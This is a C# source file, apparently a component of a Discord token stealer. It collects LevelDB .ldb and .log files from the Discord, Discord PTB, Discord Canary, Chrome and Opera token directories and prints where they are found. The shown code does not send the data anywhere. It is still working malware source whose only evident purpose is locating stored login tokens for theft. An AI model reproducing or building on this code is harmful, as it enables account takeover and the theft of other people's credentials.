using System;
using System.Collections.Generic;
using System.IO;
using TokenDirectories;

namespace Foundations
{
    class Utilities
    {
        /// <summary>
        /// Retrieve all token files within a given directory.
        /// </summary>
        /// <param name="directory"></param>
        /// <returns></returns>
        private static List<string> RetrieveTokenFiles(string directory)
        {
            var collectedFilePaths = new List<string>();
            if (Directory.Exists(directory))
            {
                string[] filePaths = Directory.GetFiles(directory);
                var filteredFilePaths = Array.FindAll(filePaths, specifiedFile => specifiedFile.EndsWith(".ldb") || specifiedFile.EndsWith(".log"));
                foreach (var retrievedFile in filteredFilePaths)
                    collectedFilePaths.Add(retrievedFile);
                return collectedFilePaths;
            }

            return collectedFilePaths;
        }

        /// <summary>
        /// Retrieves all discord token files within all possible directories.
        /// </summary>
        /// <returns></returns>
        public static List<string> RetrieveAllTokenFiles()
        {
            var collectedFilePaths = new List<string>();
            var discordTokenFiles = RetrieveTokenFiles(Directories.discordTokenDirectory);
            var ptbTokenFiles = RetrieveTokenFiles(Directories.ptbTokenDirectory);
            var canaryTokenFiles = RetrieveTokenFiles(Directories.canaryTokenDirectory);
            var chromeTokenFiles = RetrieveTokenFiles(Directories.chromeTokenDirectory);
            var operaTokenFiles = RetrieveTokenFiles(Directories.operaTokenDirectory);
            collectedFilePaths.AddRange(discordTokenFiles);
            collectedFilePaths.AddRange(ptbTokenFiles);
            collectedFilePaths.AddRange(canaryTokenFiles);
            collectedFilePaths.AddRange(chromeTokenFiles);
            collectedFilePaths.AddRange(operaTokenFiles);
            return collectedFilePaths;
        }

        /// <summary>
        /// Prints token locations to the console.
        /// </summary>
        /// <param name="tokenLocations"></param>
        public static void PrintTokenLocations(List<string> tokenLocations)
        {
            foreach (var tokenLocation in tokenLocations)
                Console.Write($"Token File Found: {tokenLocation}\n");
        }
    }
}